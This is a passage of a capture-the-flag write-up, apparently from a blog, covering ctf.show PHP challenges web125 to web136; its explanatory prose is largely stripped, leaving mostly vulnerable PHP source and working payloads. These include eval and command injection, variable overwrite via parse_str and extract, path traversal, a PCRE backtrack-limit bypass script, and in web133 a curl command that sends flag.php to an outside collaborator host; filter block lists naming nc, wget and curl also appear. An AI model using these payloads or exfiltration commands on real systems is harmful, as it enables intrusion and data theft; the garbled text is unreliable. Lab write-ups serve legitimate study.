On(Off)$_SERVER[argv]\n    \n$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n    \n$argv,$argcweb\n</code></pre>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$_SERVER[argv][0] = $_SERVER[QUERY_STRING]</span><br><span class=\"line\"> $_SERVER[QUERY_STRING] ?</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?$fl0g=flag_give_me;</span><br><span class=\"line\"></span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>highlight_file()</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?1=flag.php</span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n\n<p>(url)<code>$a[1]</code><code>fl0g=flag_give_me</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+2+fl0g=flag_give_me//url</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\"> a=1+fl0g=flag_give_me</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$ctf_show = md5($flag);</span><br><span class=\"line\">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">function waf($url)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(waf($url))&#123;</span><br><span class=\"line\">    die(&quot;&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    extract($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>urlurl</p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function waf($num)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $num))&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class=\"line\">\t$num=chr($i);</span><br><span class=\"line\">\tif(waf($num))&#123;</span><br><span class=\"line\">\t\techo &quot;&quot;.$num.&quot;   &quot;.urlencode(chr($i)).&quot;\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>%20</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class=\"line\">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(check($f1))&#123;</span><br><span class=\"line\">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p>gettext</p>\n<p> _()  gettext()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo gettext(&quot;phpinfo&quot;);</span><br><span class=\"line\">  phpinfo</span><br><span class=\"line\"></span><br><span class=\"line\">echo _(&quot;phpinfo&quot;);</span><br><span class=\"line\"> phpinfo</span><br></pre></td></tr></table></figure>\n\n<p> <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> phpinfo</p>\n<p>flagflag.phpget_defined_vars</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_defined_vars ( void ) : array</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_GET[&#x27;f&#x27;];</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class=\"line\">        echo readfile($f);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>../</code>   </p>\n<p><code>./</code>    </p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=../../ctfshow../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>preg_matchfalse10</p>\n<p>if(0 &#x3D;&#x3D;&#x3D; flase)false0false</p>\n<p>stripos()nullnull!&#x3D;&#x3D;flase</p>\n</blockquote>\n<p>&#x2F;s.+?+?1ctfshowf&#x3D;ctfshow</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=ctfshow[]</span><br><span class=\"line\">?f[]=1</span><br><span class=\"line\">?f=ctfshow  (ctfshow)</span><br></pre></td></tr></table></figure>\n\n<p>pPCRE</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\" >https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>PHPreDOSpcre<code>pcre.backtrack_limit</code><code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code></p>\n<p>PHP</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>PCRE</p>\n<h3 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h3><p>&#x2F;admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class=\"line\">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class=\"line\">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false &amp;&amp; false || true)&#123;</span><br><span class=\"line\">\techo &quot;true!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;false!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//true</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=admin&amp;password=admin&amp;username=admin</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web133\"><a href=\"#web133\" class=\"headerlink\" title=\"web133\"></a>web133</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;6?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get   F=`$F `;sleep 3</span><br><span class=\"line\">substr($F,0,6)   `$F `;</span><br><span class=\"line\"> eval(&quot;`$F `;&quot;);</span><br><span class=\"line\">$F</span><br><span class=\"line\">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class=\"line\">  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\"> sleep 3</span><br><span class=\"line\"> RCE</span><br></pre></td></tr></table></figure>\n\n<p>shell curl <br> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl  http://xxx:4567?p=`tac f*`</span><br></pre></td></tr></table></figure>\n\n<p>ipbp</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key1 = 0;</span><br><span class=\"line\">$key2 = 0;</span><br><span class=\"line\">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class=\"line\">    die(&quot;nonononono&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class=\"line\">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>extract</code></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">var_dump($_POST);</span><br><span class=\"line\">// _POST[a]=123</span><br><span class=\"line\">array(1) &#123; [&quot;a&quot;]=&gt; string(3) 123 &#125;</span><br><span class=\"line\">$_POST[a]123</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web135\"><a href=\"#web135\" class=\"headerlink\" title=\"web135\"></a>web135</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?F=`$F` ;cp flag.php 2.txt;</span><br><span class=\"line\">?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>linuxtee</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 